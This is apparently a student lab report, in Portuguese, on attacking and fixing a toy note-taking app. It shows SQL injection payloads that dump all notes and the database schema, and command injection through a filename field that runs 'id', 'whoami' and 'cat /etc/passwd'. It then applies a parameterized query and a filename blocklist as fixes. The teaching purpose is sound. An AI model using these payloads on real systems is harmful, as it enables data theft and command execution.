## Exercício 1: Reconhecimento de SQL injection

Pesquisa normal por "Welcome":

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: Welcome
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%Welcome%'
  [1] Welcome: This is your first note.
```

---

**Payload 1: `' OR '1'='1`**

```
  Search query: ' OR '1'='1
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' OR '1'='1%'
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

O `LIKE '%'` é verdadeiro para qualquer linha, por isso o `OR` faz com que a query devolva todas as notas. A aspa `'` fecha o literal de string do SQL e o resto é interpretado como código SQL.

---

**Payload 2: `' UNION SELECT 1, sql, '' FROM sqlite_master --`**

```
  Search query: ' UNION SELECT 1, sql, '' FROM sqlite_master --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 1, sql, '' FROM sqlite_master --%'
  [1] CREATE TABLE notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT): 
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Extrai o schema da base de dados. O `--` comenta o resto da query original. Um atacante usa isto para perceber a estrutura das tabelas antes de ataques mais direcionados.

---

**Payload 3: `' UNION SELECT 1, title, body FROM notes --`**

```
  Search query: ' UNION SELECT 1, title, body FROM notes --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 1, title, body FROM notes --%'
  [1] Reminder: Submit the SSI lab report on time.
  [1] Secret: The admin password is hunter2.
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Devolve todas as notas incluindo a nota "Secret" com a password do admin.

## Exercício 2: Command injection

Exportação normal da nota 1 para `note.txt`:

```
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt
  Note exported to note.txt
```

---

**Payload 2: `note.txt; id; whoami`**

```
  Enter filename to export to: note.txt; id; whoami
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt; id; whoami
uid=1000(jose) gid=1000(jose) groups=1000(jose),4(adm),20(dialout),24(cdrom),27(sudo)...
jose
  Note exported to note.txt; id; whoami
```

O `;` termina o `echo` e inicia novos comandos. O `os.system()` passa a string inteira para a shell que interpreta os separadores.

---

**Payload 3: `note.txt; cat /etc/passwd`**

```
  Enter filename to export to: note.txt; cat /etc/passwd
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

---

**Payload 4: `` `ls -la /tmp/notes.db` ``**

```
  Enter filename to export to: `ls -la /tmp/notes.db`
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > `ls -la /tmp/notes.db`
sh: 1: cannot create -rw-r--r-- 1 jose jose 8192 May 11 15:00 /tmp/notes.db: Directory nonexistent
```

A shell executa o conteúdo das backticks como subcomando e tenta usar o output como nome de ficheiro. Num servidor real um atacante podia correr qualquer comando com as permissões do processo.

## Exercício 3: Remediação SQL injection

A correção foi substituir a concatenação de strings por uma query parametrizada com `?`. O SQLite passa o valor como dado separado e nunca o interpreta como SQL.

Função corrigida (ver `noteapp.py`):

```python
sql = "SELECT id, title, body FROM notes WHERE title LIKE ?"
cursor = conn.execute(sql, (f'%{query}%',))
```

Teste com os payloads anteriores:

```
  Search query: ' OR '1'='1
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ?
  No notes found.

  Search query: ' UNION SELECT 1, sql, '' FROM sqlite_master --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ?
  No notes found.

  Search query: Welcome
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ?
  [1] Welcome: This is your first note.
```

Os payloads são tratados como texto literal. A pesquisa normal continua a funcionar.

## Exercício 4: Remediação command injection

A correção foi eliminar o `os.system()` e escrever o ficheiro diretamente com `open()`. Sem invocar a shell, não há interpretação de `;`, backticks ou outros operadores. Adicionámos também validação do nome do ficheiro.

Função corrigida (ver `noteapp.py`):

```python
if not filename or any(c in filename for c in ('/', '\\', ';', '&', '|', '`', '$')):
    print("  Invalid filename.")
    return

with open(filename, 'w') as f:
    f.write(f"Title: {row[0]}\nBody: {row[1]}\n")
```

Teste com os payloads anteriores:

```
  Enter filename to export to: note.txt; cat /etc/passwd
  Invalid filename.

  Enter filename to export to: `ls -la`
  Invalid filename.

  Enter filename to export to: note.txt
  Note exported to note.txt
```
